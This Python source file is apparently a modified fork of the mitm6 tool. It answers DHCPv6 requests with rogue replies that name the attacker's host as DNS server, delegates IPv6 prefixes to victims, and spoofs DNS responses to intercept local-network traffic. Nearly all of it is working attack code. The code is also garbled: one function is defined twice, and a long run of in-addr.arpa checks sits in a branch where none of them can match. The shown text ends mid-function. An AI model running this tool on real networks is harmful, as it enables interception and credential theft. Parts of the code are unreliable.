#!/usr/bin/python3
# Patched MITM6 version - jpanderson@trustwave.com
#
#   This version is a fork of the original MITM6 project, with the following changes:
#   - Uses a global unicast address instead of a link-local address, this is likely to be
#     preferred by most devices as per RFC6742 address selection rules.
#   - Added support for DHCPv6 Prefix Delegation
#     This lets you delegate an entire prefix to IPv6 clients. This is typically used by devices
#     such as routers, IoT gateways etc to get an address range for use behind the router.
#   - Added support for traffic analysis
# 
#  Usage:
#   You will need to bind an IPv6 address to your machine "ip addr add 2001:db8::1/64 dev eth0"
#   It is preferable to use a global unicast address from your own address space.
#   The example prefix 2001:db8::/32 is officially reserved for documentation, and might be deprioritised.
#   Run with: python3 mitm6.py -i eth0 -v --debug
#   Consider adding a domain whitelist
#
#  Tcpdump:
#   Ensure that tcpdump is running when you use this - eg "tcpdump -s 0 -w tcp6.log -n ip6"



from __future__ import unicode_literals
from scapy.all import sniff, ls, ARP, IPv6, DNS, DNSRR, Ether, conf, IP, UDP, Raw, ICMP
from twisted.internet import reactor
from twisted.internet.protocol import ProcessProtocol, DatagramProtocol
from scapy.layers.dhcp6 import *
from scapy.layers.inet6 import *
from scapy.sendrecv import sendp
from twisted.internet import task, threads
from builtins import str
import os
import json
import random
import ipaddress
import netifaces
import sys
import argparse
import socket
import builtins
import struct
import threading

# Globals
pcdict = {}
arptable = {}
try:
    with open('arp.cache', 'r') as arpcache:
        arptable = json.load(arpcache)
except IOError:
    pass

# Config class - contains runtime config
class Config(object):
    def __init__(self, args):
        # IP autodiscovery / config override
        if args.interface is None:
            self.dgw = netifaces.gateways()['default']
            self.default_if = self.dgw[netifaces.AF_INET][1]
        else:
            self.default_if = args.interface
        if args.ipv4 is None:
            self.v4addr = netifaces.ifaddresses(self.default_if)[netifaces.AF_INET][0]['addr']
        else:
            self.v4addr = args.ipv4
        if args.ipv6 is None:
            try:
                self.v6addr = None
                self.v6addr_type = None
                addrs = netifaces.ifaddresses(self.default_if)[netifaces.AF_INET6]
                
                # First, look for global unicast addresses (2000::/3)
                for addr in addrs:
                    addr_str = addr['addr']
                    if '%' in addr_str:
                        addr_str = addr_str[:addr_str.index('%')]
                    
                    try:
                        ipv6_obj = ipaddress.IPv6Address(addr_str)
                        if ipv6_obj.is_global:
                            self.v6addr = addr['addr']
                            self.v6addr_type = 'global'
                            break
                    except ipaddress.AddressValueError:
                        continue
                
                # If no global address found, look for documentation prefix (2001:db8::/32)
                if not self.v6addr:
                    for addr in addrs:
                        addr_str = addr['addr']
                        if '%' in addr_str:
                            addr_str = addr_str[:addr_str.index('%')]
                        
                        try:
                            ipv6_obj = ipaddress.IPv6Address(addr_str)
                            # Check if it's in the documentation prefix (2001:db8::/32)
                            if ipv6_obj in ipaddress.IPv6Network('2001:db8::/32'):
                                self.v6addr = addr['addr']
                                self.v6addr_type = 'documentation'
                                break
                        except ipaddress.AddressValueError:
                            continue
                
                # If no documentation address found, look for ULA (fc00::/7)
                if not self.v6addr:
                    for addr in addrs:
                        addr_str = addr['addr']
                        if '%' in addr_str:
                            addr_str = addr_str[:addr_str.index('%')]
                        
                        try:
                            ipv6_obj = ipaddress.IPv6Address(addr_str)
                            if ipv6_obj.is_private:  # ULA addresses
                                self.v6addr = addr['addr']
                                self.v6addr_type = 'ula'
                                break
                        except ipaddress.AddressValueError:
                            continue
                
                # If still no address found, look for link-local (fe80::/10)
                if not self.v6addr:
                    for addr in addrs:
                        addr_str = addr['addr']
                        if '%' in addr_str:
                            addr_str = addr_str[:addr_str.index('%')]
                        
                        try:
                            ipv6_obj = ipaddress.IPv6Address(addr_str)
                            if ipv6_obj.is_link_local:
                                self.v6addr = addr['addr']
                                self.v6addr_type = 'link-local'
                                break
                        except ipaddress.AddressValueError:
                            continue
                
                # If no suitable address found, exit
                if not self.v6addr:
                    print('Error: The interface {0} does not have any IPv6 address assigned. Make sure IPv6 is activated on this interface.'.format(self.default_if))
                    sys.exit(1)
                
                # Warn about lower precedence addresses
                if self.v6addr_type not in ['global', 'documentation']:
                    print('Warning: Using {0} IPv6 address ({1}). This has lower precedence than global unicast addresses.'.format(
                        self.v6addr_type, self.v6addr))
                    print('Consider configuring a global unicast address (2000::/3) for better compatibility.')
                    
            except KeyError:
                print('Error: The interface {0} does not have any IPv6 addresses. Make sure IPv6 is activated on this interface.'.format(self.default_if))
                sys.exit(1)
        else:
            self.v6addr = args.ipv6
            # Determine the type of the manually specified address
            try:
                addr_str = self.v6addr
                if '%' in addr_str:
                    addr_str = addr_str[:addr_str.index('%')]
                ipv6_obj = ipaddress.IPv6Address(addr_str)
                if ipv6_obj.is_global:
                    self.v6addr_type = 'global'
                elif ipv6_obj in ipaddress.IPv6Network('2001:db8::/32'):
                    self.v6addr_type = 'documentation'
                elif ipv6_obj.is_private:
                    self.v6addr_type = 'ula'
                elif ipv6_obj.is_link_local:
                    self.v6addr_type = 'link-local'
                else:
                    self.v6addr_type = 'other'
                
                if self.v6addr_type not in ['global', 'documentation']:
                    print('Warning: Using {0} IPv6 address ({1}). This has lower precedence than global unicast addresses.'.format(
                        self.v6addr_type, self.v6addr))
                    print('Consider using a global unicast address (2000::/3) for better compatibility.')
            except ipaddress.AddressValueError:
                print('Warning: Could not determine IPv6 address type for {0}'.format(self.v6addr))
                self.v6addr_type = 'unknown'
        if args.mac is None:
            self.macaddr = netifaces.ifaddresses(self.default_if)[netifaces.AF_LINK][0]['addr']
        else:
            self.macaddr = args.mac

        if '%' in self.v6addr:
            self.v6addr = self.v6addr[:self.v6addr.index('%')]
        # End IP autodiscovery

        # This is partly static, partly filled in from the autodiscovery above
        # Calculate IPv6 prefix from interface address or use provided argument
        if args.ipv6_prefix is None:
            # Extract prefix from the interface IPv6 address (assuming /64)
            try:
                # Parse the IPv6 address properly
                ipv6_obj = ipaddress.IPv6Address(self.v6addr)
                # Create a /64 network from the address
                network = ipaddress.IPv6Network(str(ipv6_obj) + '/64', strict=False)
                # Get the network address (prefix)
                self.ipv6prefix = str(network.network_address)
            except (ipaddress.AddressValueError, ValueError):
                # Fallback based on address type
                if self.v6addr_type == 'global':
                    self.ipv6prefix = '2001:db8::'  # Documentation prefix
                elif self.v6addr_type == 'ula':
                    self.ipv6prefix = 'fd00::'      # ULA prefix
                else:
                    self.ipv6prefix = 'fe80::'      # Link-local prefix
        else:
            self.ipv6prefix = args.ipv6_prefix
            
        self.selfaddr = self.v6addr
        self.selfmac = self.macaddr
        self.ipv6cidr = '64'
        self.selfipv4 = self.v4addr
        self.selfduid = DUID_LL(lladdr = self.macaddr)
        self.selfptr = ipaddress.ip_address(str(self.selfaddr)).reverse_pointer + '.'
        self.ipv6noaddr = random.randint(1,9999)
        self.ipv6noaddrc = 1
        # DNS whitelist / blacklist options
        self.dns_whitelist = [d.lower() for d in args.domain]
        self.dns_blacklist = [d.lower() for d in args.blacklist]
        # Hostname (DHCPv6 FQDN) whitelist / blacklist options
        self.host_whitelist = [d.lower() for d in args.host_whitelist]
        self.host_blacklist = [d.lower() for d in args.host_blacklist]
        # Should DHCPv6 queries that do not specify a FQDN be ignored?
        self.ignore_nofqdn = args.ignore_nofqdn
        # Local domain to advertise
        # If no localdomain is specified, use the first dnsdomain
        if args.localdomain is None:
            try:
                self.localdomain = args.domain[0]
            except IndexError:
                self.localdomain = None
        else:
            self.localdomain = args.localdomain.lower()

        self.debug = args.debug
        self.verbose = args.verbose
        
        # Router Advertisement flags
        self.no_managed = args.no_managed
        self.no_other = args.no_other
        self.no_ra = args.no_ra
        
        # DHCPv6 configuration
        self.disable_dhcpv6 = args.disable_dhcpv6
        
        # Traffic analysis configuration
        self.show_traffic = args.show_traffic
        self.include_legacy = args.include_legacy
        
        # Output file configuration
        self.output_file = args.output
        
        # Router detection configuration
        self.ignore_existing_v6_risk_dos = args.ignore_existing_v6_risk_dos
        
        # PREF64 configuration for NAT64 support
        self.enable_pref64 = args.enable_pref64
        if args.nat64_prefix is None:
            self.nat64_prefix = '64:ff9b::/96'  # Well-known NAT64 prefix
        else:
            self.nat64_prefix = args.nat64_prefix
        
        # Parse the NAT64 prefix to get network and length
        if self.enable_pref64:
            try:
                nat64_network = ipaddress.IPv6Network(self.nat64_prefix, strict=False)
                self.nat64_network = nat64_network
                self.nat64_length = nat64_network.prefixlen
            except ipaddress.AddressValueError:
                print('Error: Invalid NAT64 prefix: %s' % self.nat64_prefix)
                sys.exit(1)
        
        # Prefix delegation configuration
        if args.delegation_prefix is None:
            self.delegation_prefix = '2001:db8:123::/48'
        else:
            self.delegation_prefix = args.delegation_prefix
        
        # Parse the delegation prefix to get network and length
        try:
            delegation_network = ipaddress.IPv6Network(self.delegation_prefix, strict=False)
            self.delegation_network = delegation_network
            self.delegation_length = delegation_network.prefixlen
        except ipaddress.AddressValueError:
            print('Error: Invalid delegation prefix: %s' % self.delegation_prefix)
            sys.exit(1)
        
        # Track delegated prefixes to avoid conflicts
        self.delegated_prefixes = set()
        self.delegation_counter = 0
        
        # End of config

# Target class - defines the host we are targetting
class Target(object):
    def __init__(self, mac, host, ipv4=None):
        self.mac = mac
        # Make sure the host is in unicode
        try:
            self.host = host.decode("utf-8")
        except builtins.AttributeError:
            # Already in unicode
            self.host = host
        if ipv4 is not None:
            self.ipv4 = ipv4
        else:
            #Set the IP from the arptable if it is there
            try:
                self.ipv4 = arptable[mac]
            except KeyError:
                self.ipv4 = ''
        # Initialize IPv6 address tracking (multiple addresses per type)
        self.ipv6_slaac = set()  # Multiple SLAAC addresses (stable + privacy)
        self.ipv6_dhcpv6 = set()  # Multiple DHCPv6 addresses
        self.ipv6_link_local = set()  # Multiple link-local addresses

    def __str__(self):
        ipv6_info = []
        if hasattr(self, 'ipv6_slaac') and self.ipv6_slaac:
            ipv6_info.append('slaac=%s' % ', '.join(sorted(self.ipv6_slaac)))
        if hasattr(self, 'ipv6_dhcpv6') and self.ipv6_dhcpv6:
            ipv6_info.append('dhcpv6=%s' % ', '.join(sorted(self.ipv6_dhcpv6)))
        if hasattr(self, 'ipv6_link_local') and self.ipv6_link_local:
            ipv6_info.append('link-local=%s' % ', '.join(sorted(self.ipv6_link_local)))
        
        ipv6_str = ' ' + ' '.join(ipv6_info) if ipv6_info else ''
        return 'mac=%s host=%s ipv4=%s%s' % (self.mac, str(self.host), self.ipv4, ipv6_str)

    def __repr__(self):
        return '<Target %s>' % self.__str__()

def get_fqdn(dhcp6packet):
    try:
        fqdn = dhcp6packet[DHCP6OptClientFQDN].fqdn
        if fqdn[-1] == '.':
            return fqdn[:-1]
        else:
            return fqdn
    #if not specified
    except KeyError:
        return ''

def send_dhcp_advertise(p, basep, target):
    global ipv6noaddrc
    resp = Ether(dst=basep.src)/IPv6(src=config.selfaddr, dst=basep[IPv6].src)/UDP(sport=547, dport=546) #base packet
    resp /= DHCP6_Advertise(trid=p.trid)
    #resp /= DHCP6OptPref(prefval = 255)
    resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
    resp /= DHCP6OptServerId(duid=config.selfduid)
    resp /= DHCP6OptDNSServers(dnsservers=[config.selfaddr])
    if config.localdomain:
        resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
    if target.ipv4 != '':
        # Ensure proper IPv6 address formatting
        if config.ipv6prefix.endswith('::'):
            addr = config.ipv6prefix + target.ipv4.replace('.', ':')
        else:
            addr = config.ipv6prefix + ':' + target.ipv4.replace('.', ':')
    else:
        # Ensure proper IPv6 address formatting
        if config.ipv6prefix.endswith('::'):
            addr = config.ipv6prefix + '%d:%d' % (config.ipv6noaddr, config.ipv6noaddrc)
        else:
            addr = config.ipv6prefix + ':%d:%d' % (config.ipv6noaddr, config.ipv6noaddrc)
        config.ipv6noaddrc += 1
    opt = DHCP6OptIAAddress(preflft=300, validlft=300, addr=addr)
    resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=200, T2=250, iaid=p[DHCP6OptIA_NA].iaid)
    sendp(resp, iface=config.default_if, verbose=False)

def send_dhcp_reply(p, basep):
    resp = Ether(dst=basep.src)/IPv6(src=config.selfaddr, dst=basep[IPv6].src)/UDP(sport=547, dport=546) #base packet
    resp /= DHCP6_Reply(trid=p.trid)
    #resp /= DHCP6OptPref(prefval = 255)
    resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
    resp /= DHCP6OptServerId(duid=config.selfduid)
    resp /= DHCP6OptDNSServers(dnsservers=[config.selfaddr])
    if config.localdomain:
        resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
    try:
        # Try to get the address option directly (for Request messages)
        opt = p[DHCP6OptIAAddress]
        resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=200, T2=250, iaid=p[DHCP6OptIA_NA].iaid)
        sendp(resp, iface=config.default_if, verbose=False)
    except IndexError:
        # For Renew messages, the address is nested in IA_NA.ianaopts
        try:
            ia_na = p[DHCP6OptIA_NA]
            if ia_na.ianaopts and len(ia_na.ianaopts) > 0:
                # Use the address from the Renew request
                opt = ia_na.ianaopts[0]
                resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=200, T2=250, iaid=ia_na.iaid)
                sendp(resp, iface=config.default_if, verbose=False)
            else:
                if config.debug or config.verbose:
                    print('Ignoring DHCPv6 packet from %s: IA_NA has no address options' % basep.src)
        except (IndexError, KeyError, AttributeError):
            # Some hosts don't send back this layer for some reason, ignore those
            if config.debug or config.verbose:
                print('Ignoring DHCPv6 packet from %s: Missing DHCP6OptIAAddress layer' % basep.src)

def send_dhcp_pd_advertise(p, basep, target):
    """Send DHCPv6 Prefix Delegation Advertise message"""
    resp = Ether(dst=basep.src)/IPv6(src=config.selfaddr, dst=basep[IPv6].src)/UDP(sport=547, dport=546)
    resp /= DHCP6_Advertise(trid=p.trid)
    resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
    resp /= DHCP6OptServerId(duid=config.selfduid)
    
    # Handle prefix delegation request
    try:
        ia_pd = p[DHCP6OptIA_PD]
        iaid = ia_pd.iaid
        
        # Check for delegation hint
        requested_length = 64  # Default to /64
        if DHCP6OptIAPrefix in p:
            hint = p[DHCP6OptIAPrefix]
            if hasattr(hint, 'prefixlen'):
                requested_length = hint.prefixlen
        
        # Generate delegated prefix
        delegated_prefix = generate_delegated_prefix(requested_length)
        if delegated_prefix:
            # Create prefix option
            prefix_opt = DHCP6OptIAPrefix(
                prefix=delegated_prefix.network_address,
                prefixlen=delegated_prefix.prefixlen,
                preferredlifetime=300,
                validlifetime=600
            )
            
            # Create IA_PD option
            resp /= DHCP6OptIA_PD(iaid=iaid, T1=200, T2=250, ianaopts=[prefix_opt])
            
            if config.verbose:
                print('Prefix delegation advertised: %s/%d to %s' % (delegated_prefix.network_address, delegated_prefix.prefixlen, target))
        else:
            if config.verbose:
                print('No available prefixes for delegation to %s' % target)
            # Send reply without prefix delegation
            resp /= DHCP6OptIA_PD(iaid=iaid, T1=200, T2=250)
            
    except Exception as e:
        if config.verbose or config.debug:
            print('Error processing prefix delegation request: %s' % str(e))
        # Send basic reply
        resp /= DHCP6OptIA_PD(iaid=p[DHCP6OptIA_PD].iaid, T1=200, T2=250)
    
    sendp(resp, iface=config.default_if, verbose=False)

def send_dhcp_pd_reply(p, basep):
    """Send DHCPv6 Prefix Delegation Reply message"""
    resp = Ether(dst=basep.src)/IPv6(src=config.selfaddr, dst=basep[IPv6].src)/UDP(sport=547, dport=546)
    resp /= DHCP6_Reply(trid=p.trid)
    resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
    resp /= DHCP6OptServerId(duid=config.selfduid)
    
    # Handle prefix delegation
    try:
        ia_pd = p[DHCP6OptIA_PD]
        iaid = ia_pd.iaid
        
        # Check for delegation hint
        requested_length = 64  # Default to /64
        if DHCP6OptIAPrefix in p:
            hint = p[DHCP6OptIAPrefix]
            if hasattr(hint, 'prefixlen'):
                requested_length = hint.prefixlen
        
        # Generate delegated prefix
        delegated_prefix = generate_delegated_prefix(requested_length)
        if delegated_prefix:
            # Create prefix option
            prefix_opt = DHCP6OptIAPrefix(
                prefix=delegated_prefix.network_address,
                prefixlen=delegated_prefix.prefixlen,
                preferredlifetime=300,
                validlifetime=600
            )
            
            # Create IA_PD option
            resp /= DHCP6OptIA_PD(iaid=iaid, T1=200, T2=250, ianaopts=[prefix_opt])
            
            if config.verbose:
                print('Prefix delegated: %s/%d to %s' % (delegated_prefix.network_address, delegated_prefix.prefixlen, basep.src))
        else:
            if config.verbose:
                print('No available prefixes for delegation to %s' % basep.src)
            # Send basic reply
            resp /= DHCP6OptIA_PD(iaid=iaid, T1=200, T2=250)
            
    except Exception as e:
        if config.verbose or config.debug:
            print('Error processing prefix delegation reply: %s' % str(e))
        # Send basic reply
        resp /= DHCP6OptIA_PD(iaid=p[DHCP6OptIA_PD].iaid, T1=200, T2=250)
    
    sendp(resp, iface=config.default_if, verbose=False)

def send_dhcp_pd_reply(p, basep):
    """Send DHCPv6 Prefix Delegation Reply message"""
    resp = Ether(dst=basep.src)/IPv6(src=config.selfaddr, dst=basep[IPv6].src)/UDP(sport=547, dport=546)
    resp /= DHCP6_Reply(trid=p.trid)
    resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
    resp /= DHCP6OptServerId(duid=config.selfduid)
    
    # Handle prefix delegation
    try:
        ia_pd = p[DHCP6OptIA_PD]
        iaid = ia_pd.iaid
        
        # Check for delegation hint
        requested_length = 64  # Default to /64
        if DHCP6OptIAPrefix in p:
            hint = p[DHCP6OptIAPrefix]
            if hasattr(hint, 'prefixlen'):
                requested_length = hint.prefixlen
        
        # Generate delegated prefix
        delegated_prefix = generate_delegated_prefix(requested_length)
        if delegated_prefix:
            # Create prefix option
            prefix_opt = DHCP6OptIAPrefix(
                prefix=delegated_prefix.network_address,
                prefixlen=delegated_prefix.prefixlen,
                preferredlifetime=300,
                validlifetime=600
            )
            
            # Create IA_PD option
            resp /= DHCP6OptIA_PD(iaid=iaid, T1=200, T2=250, ianaopts=[prefix_opt])
            
            if config.verbose:
                print('Prefix delegated: %s/%d to %s' % (delegated_prefix.network_address, delegated_prefix.prefixlen, basep.src))
        else:
            if config.verbose:
                print('No available prefixes for delegation to %s' % basep.src)
            # Send reply without prefix delegation
            resp /= DHCP6OptIA_PD(iaid=iaid, T1=200, T2=250)
            
    except Exception as e:
        if config.verbose or config.debug:
            print('Error processing prefix delegation reply: %s' % str(e))
        # Send basic reply
        resp /= DHCP6OptIA_PD(iaid=p[DHCP6OptIA_PD].iaid, T1=200, T2=250)
    
    sendp(resp, iface=config.default_if, verbose=False)

def encode_ipv4_to_nat64(ipv4_addr, nat64_prefix, nat64_length):
    """Encode an IPv4 address into a NAT64 IPv6 address"""
    try:
        # Parse the NAT64 prefix
        nat64_base = nat64_prefix.split('/')[0]
        nat64_network = ipaddress.IPv6Network(nat64_prefix, strict=False)
        
        # Parse IPv4 address
        ipv4_obj = ipaddress.IPv4Address(ipv4_addr)
        ipv4_int = int(ipv4_obj)
        
        # For /96 or shorter prefixes, replace the last 32 bits with IPv4
        if nat64_length <= 96:
            # Get the network address as an integer
            nat64_int = int(nat64_network.network_address)
            # Clear the last 32 bits and add the IPv4 address
            nat64_int = (nat64_int & 0xffffffffffffffffffffffff00000000) | ipv4_int
            # Convert back to IPv6 address
            return str(ipaddress.IPv6Address(nat64_int))
        else:
            # For longer prefixes, append IPv4 to the prefix
            # This is less common but handle it anyway
            ipv4_hex = format(ipv4_int, '08x')
            return nat64_base + ':' + ipv4_hex[:4] + ':' + ipv4_hex[4:8]
    except Exception:
        return None

def send_dns_reply(p):
    if IPv6 in p:
        ip = p[IPv6]
        resp = Ether(dst=p.src, src=p.dst)/IPv6(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)
    else:
        ip = p[IP]
        resp = Ether(dst=p.src, src=p.dst)/IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)
    dns = p[DNS]
    #only reply to IN, and to messages that dont contain answers
    if dns.qd.qclass != 1 or dns.qr != 0:
        return
    #Make sure the requested name is in unicode here
    reqname = dns.qd.qname.decode()
    
    # Check for ipv4only.arpa queries and log them (IPv6-only mode detection)
    if reqname.endswith('ipv4only.arpa.'):
        if IPv6 in p:
            print('*** IPv6-ONLY MODE DETECTED: Host %s (%s) queried %s' % (p.src, ip.src, reqname))
        else:
            print('*** IPv6-ONLY MODE DETECTED: Host %s (%s) queried %s' % (p.src, ip.src, reqname))
    
    # Initialize response data variables
    rdata = None
    rdata_list = None
    #A request
    if dns.qd.qtype == 1:
        # Check if this is for ipv4only.arpa (NAT64)
        if reqname.endswith('ipv4only.arpa.'):
            if config.enable_pref64:
                # For ipv4only.arpa, return the well-known IPv4 addresses
                # RFC 8880 specifies 192.0.0.170 and 192.0.0.171
                if reqname == 'ipv4only.arpa.':
                    # Return both IPv4 addresses - we'll send multiple RRs
                    rdata_list = ['192.0.0.170', '192.0.0.171']
                elif reqname == '170.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.170'  # Reverse lookup
                elif reqname == '171.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.171'  # Second IPv4 address
                elif reqname == '172.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.172'  # Third IPv4 address
                elif reqname == '173.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.173'  # Fourth IPv4 address
                elif reqname == '174.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.174'  # Fifth IPv4 address
                elif reqname == '175.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.175'  # Sixth IPv4 address
                elif reqname == '176.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.176'  # Seventh IPv4 address
                elif reqname == '177.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.177'  # Eighth IPv4 address
                elif reqname == '178.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.178'  # Ninth IPv4 address
                elif reqname == '179.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.179'  # Tenth IPv4 address
                elif reqname == '180.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.180'  # Eleventh IPv4 address
                elif reqname == '181.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.181'  # Twelfth IPv4 address
                elif reqname == '182.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.182'  # Thirteenth IPv4 address
                elif reqname == '183.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.183'  # Fourteenth IPv4 address
                elif reqname == '184.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.184'  # Fifteenth IPv4 address
                elif reqname == '185.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.185'  # Sixteenth IPv4 address
                elif reqname == '186.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.186'  # Seventeenth IPv4 address
                elif reqname == '187.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.187'  # Eighteenth IPv4 address
                elif reqname == '188.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.188'  # Nineteenth IPv4 address
                elif reqname == '189.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.189'  # Twentieth IPv4 address
                elif reqname == '190.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.190'  # Twenty-first IPv4 address
                elif reqname == '191.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.191'  # Twenty-second IPv4 address
                elif reqname == '192.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.192'  # Twenty-third IPv4 address
                elif reqname == '193.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.193'  # Twenty-fourth IPv4 address
                elif reqname == '194.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.194'  # Twenty-fifth IPv4 address
                elif reqname == '195.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.195'  # Twenty-sixth IPv4 address
                elif reqname == '196.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.196'  # Twenty-seventh IPv4 address
                elif reqname == '197.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.197'  # Twenty-eighth IPv4 address
                elif reqname == '198.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.198'  # Twenty-ninth IPv4 address
                elif reqname == '199.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.199'  # Thirtieth IPv4 address
                elif reqname == '200.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.200'  # Thirty-first IPv4 address
                elif reqname == '201.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.201'  # Thirty-second IPv4 address
                elif reqname == '202.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.202'  # Thirty-third IPv4 address
                elif reqname == '203.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.203'  # Thirty-fourth IPv4 address
                elif reqname == '204.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.204'  # Thirty-fifth IPv4 address
                elif reqname == '205.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.205'  # Thirty-sixth IPv4 address
                elif reqname == '206.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.206'  # Thirty-seventh IPv4 address
                elif reqname == '207.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.207'  # Thirty-eighth IPv4 address
                elif reqname == '208.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.208'  # Thirty-ninth IPv4 address
                elif reqname == '209.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.209'  # Fortieth IPv4 address
                elif reqname == '210.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.210'  # Forty-first IPv4 address
                elif reqname == '211.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.211'  # Forty-second IPv4 address
                elif reqname == '212.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.212'  # Forty-third IPv4 address
                elif reqname == '213.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.213'  # Forty-fourth IPv4 address
                elif reqname == '214.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.214'  # Forty-fifth IPv4 address
                elif reqname == '215.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.215'  # Forty-sixth IPv4 address
                elif reqname == '216.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.216'  # Forty-seventh IPv4 address
                elif reqname == '217.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.217'  # Forty-eighth IPv4 address
                elif reqname == '218.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.218'  # Forty-ninth IPv4 address
                elif reqname == '219.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.219'  # Fiftieth IPv4 address
                elif reqname == '220.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.220'  # Fifty-first IPv4 address
                elif reqname == '221.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.221'  # Fifty-second IPv4 address
                elif reqname == '222.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.222'  # Fifty-third IPv4 address
                elif reqname == '223.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.223'  # Fifty-fourth IPv4 address
                elif reqname == '224.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.224'  # Fifty-fifth IPv4 address
                elif reqname == '225.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.225'  # Fifty-sixth IPv4 address
                elif reqname == '226.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.226'  # Fifty-seventh IPv4 address
                elif reqname == '227.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.227'  # Fifty-eighth IPv4 address
                elif reqname == '228.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.228'  # Fifty-ninth IPv4 address
                elif reqname == '229.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.229'  # Sixtieth IPv4 address
                elif reqname == '230.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.230'  # Sixty-first IPv4 address
                elif reqname == '231.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.231'  # Sixty-second IPv4 address
                elif reqname == '232.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.232'  # Sixty-third IPv4 address
                elif reqname == '233.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.233'  # Sixty-fourth IPv4 address
                elif reqname == '234.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.234'  # Sixty-fifth IPv4 address
                elif reqname == '235.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.235'  # Sixty-sixth IPv4 address
                elif reqname == '236.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.236'  # Sixty-seventh IPv4 address
                elif reqname == '237.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.237'  # Sixty-eighth IPv4 address
                elif reqname == '238.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.238'  # Sixty-ninth IPv4 address
                elif reqname == '239.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.239'  # Seventieth IPv4 address
                elif reqname == '240.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.240'  # Seventy-first IPv4 address
                elif reqname == '241.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.241'  # Seventy-second IPv4 address
                elif reqname == '242.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.242'  # Seventy-third IPv4 address
                elif reqname == '243.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.243'  # Seventy-fourth IPv4 address
                elif reqname == '244.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.244'  # Seventy-fifth IPv4 address
                elif reqname == '245.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.245'  # Seventy-sixth IPv4 address
                elif reqname == '246.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.246'  # Seventy-seventh IPv4 address
                elif reqname == '247.0.0.192.in-addr.arpa.':
                    rdata = '192.0.0.247'  # Seventy-eighth IPv4 address
